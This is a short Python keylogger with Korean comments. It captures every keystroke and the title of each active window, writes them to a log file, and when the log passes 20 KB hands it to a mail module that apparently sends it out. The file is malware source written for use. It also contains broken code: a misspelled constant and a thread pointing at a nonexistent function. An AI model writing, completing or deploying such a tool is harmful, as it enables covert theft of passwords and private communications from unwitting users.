import os
import time
import winreg
import mailmanager
import filemanager
import winmanager
from threading import Thread
from pynput.keyboard import Key, Listener

# 키 입력 감지 함수
def on_press(key):
    filemanager.logger(key)
    print(key)

# 윈도우 타이틀 감지 함수
def wintitle():
    oldtitle = winmanager.gettitle()# 창을 옮기면 감지 해야하기때문에
    while True:#무한 반복 해야하기때문에
        time.sleep(0.1)#슬립 함수 안주면 렉엄청걸림
        if winmanager.gettitle() != oldtitle:#과정기록
            filemanager.logger("\n" + winmanager.gettitle() + "\n")#로거 함수는 저장해주는 기능
        oldtitle = winmanager.gettitle()

# 파일 사이즈 감지 함수
def FSC():
    MEX_FILE_SIZE = 20000 # 키로깅 파일 최대 크기 20kb
    while True:
        time.sleep(1)
        if filemanager.getfilesize() > MAX_FILE_SIZE:# 감지하다가 20kb 도달하게되면 발동
            print("file size over")
            mailmanager.main()#메인함수를 이용하여 키로깅 내용 적용
# 메인 함수
def main():
    with Listener(on_press=on_press) as listener: # 키로깅 키 입력 감지를 실행시키는 역할
        listener.join()

# 와일문을 만나면 무한반복 다음구문 실행이안됨. 직렬시행 병렬시행으로 바꾸기 그래서 함수로함
# 멀티 쓰레딩
mainThread = Thread(target=main)
titleThread = Thread(target=wintitle)
FSCThread = Thread(target=ESC)

mainThread.start()
titleThread.start()
FSCThread.start()